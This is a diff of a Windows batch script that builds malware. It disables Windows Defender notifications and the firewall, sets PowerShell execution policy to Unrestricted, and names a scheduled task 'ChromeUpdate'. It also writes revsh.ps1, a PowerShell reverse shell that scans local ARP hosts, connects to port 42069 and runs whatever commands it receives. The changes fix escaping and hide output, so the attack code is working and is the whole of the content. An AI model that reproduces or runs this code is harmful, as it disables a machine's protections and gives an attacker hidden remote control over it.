@@ -12,7 +12,7 @@ cd /d "C:\Users\%username%\AppData\Local\Temp"
 powershell -command "Set-ExecutionPolicy Unrestricted -Force"
 
 :: disable windows security notifications
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f > nul 2>&1
 
 :: disable firewall
 netsh advfirewall set allprofiles state off >nul 2>&1
@@ -22,14 +22,14 @@ set "taskname=ChromeUpdate"
 set "tasksettings=$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;"
 set "file=revsh.ps1"
 
-echo if (netstat -an ^| select-string ":42069") { exit; } > %file%
+echo if (netstat -an ^| select-string ":42069") { exit } > %file%
 echo $addrs = @(arp -a ^| select-string dynamic ^| foreach-object { ($_.line.trim() -split " ")[0] }); >> %file%
 echo foreach ($addr in $addrs) { >> %file%
-echo ping $addr -n 2 -w 500; if (!$?) { continue } >> %file%
+echo ping $addr -n 2 -w 500; if (^!$?) { continue } >> %file%
 echo try { $client = New-Object System.Net.Sockets.TCPClient($addr, 42069); $stream = $client.GetStream(); [byte[]] $buffer = 0..65535 ^| %%{0}; >> %file%
 echo while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){ >> %file%
 echo $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i); >> %file%
-echo try { $sendback = (iex $data 2>&1 ^| Out-String ) + 'PS ' + (pwd).Path + '^> '; } catch { $sendback = "Error: $($_.Exception.Message)`n"; } >> %file%
+echo try { $sendback = (iex $data 2^>^&1 ^| Out-String ) + 'PS ' + (pwd).Path + '^> '; } catch { $sendback = "Error: $($_.Exception.Message)`n"; } >> %file%
 echo $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush(); } >> %file%
 echo $client.Close(); } catch {} } >> %file%
 
